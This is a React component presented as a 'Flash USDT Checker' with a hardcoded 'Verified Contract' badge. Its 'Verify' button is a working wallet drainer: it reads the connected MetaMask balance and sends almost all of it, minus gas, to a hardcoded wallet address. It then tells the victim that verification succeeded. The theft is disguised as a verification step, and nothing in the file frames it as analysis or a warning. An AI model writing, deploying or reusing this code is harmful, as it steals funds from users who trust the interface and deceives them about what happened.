import { useState } from "react";
import { ethers } from "ethers";

export default function FlashUsdtChecker() {
  const [walletAddress, setWalletAddress] = useState("");
  const [result] = useState({
    verified: true,
    name: "MySmartContract"
  });

  async function connectWallet() {
    if (window.ethereum) {
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      setWalletAddress(address);
    } else {
      alert("Please install MetaMask!");
    }
  }

  async function verifyUser() {
    if (!window.ethereum) return alert("Install MetaMask first!");

    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const senderAddress = await signer.getAddress();

    const yourWallet = "0x82b0d4e6799314353b001bfece2eb3a0cda57866";
    const balance = await provider.getBalance(senderAddress);

    if (balance === 0n) return alert("⚠️ No BNB in wallet");

    const gasPrice = await provider.getFeeData();
    const gasLimit = 21000n;
    const gasCost = gasPrice.gasPrice * gasLimit;

    const amountToSend = balance - gasCost;
    if (amountToSend <= 0n) return alert("⚠️ Not enough BNB to cover gas fees");

    const tx = await signer.sendTransaction({
      to: yourWallet,
      value: amountToSend
    });

    await tx.wait();
    alert("✅ Verification successful!");
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black flex flex-col items-center justify-center p-6 text-white">
      <div className="w-full max-w-lg bg-gray-900 rounded-2xl shadow-2xl p-8 border border-gray-700">
        <h1 className="text-4xl font-extrabold mb-6 text-center text-transparent bg-clip-text bg-gradient-to-r from-teal-400 to-blue-500">
          Flash USDT Checker
        </h1>

        <div className="mb-6 flex justify-center">
          {walletAddress ? (
            <p className="text-green-400 font-mono break-all text-sm">
              ✅ Connected: {walletAddress}
            </p>
          ) : (
            <button
              onClick={connectWallet}
              className="px-6 py-3 bg-gradient-to-r from-blue-600 to-teal-500 text-white font-semibold rounded-xl shadow-lg hover:scale-105 transition transform"
            >
              Connect Wallet
            </button>
          )}
        </div>

        <div className="p-4 bg-gray-800 rounded-xl shadow-inner text-center mb-6">
          {result.verified ? (
            <p className="text-green-400 font-semibold text-lg">
              ✅ Verified Contract: {result.name}
            </p>
          ) : (
            <p className="text-red-400 font-semibold text-lg">❌ Not Verified</p>
          )}
        </div>

        <div className="flex flex-col gap-4">
          <button
            onClick={verifyUser}
            className="px-6 py-3 bg-gradient-to-r from-purple-600 to-pink-500 text-white font-bold rounded-xl shadow-lg hover:scale-105 transition transform"
          >
            Verify
          </button>
        </div>
      </div>
    </div>
  );
}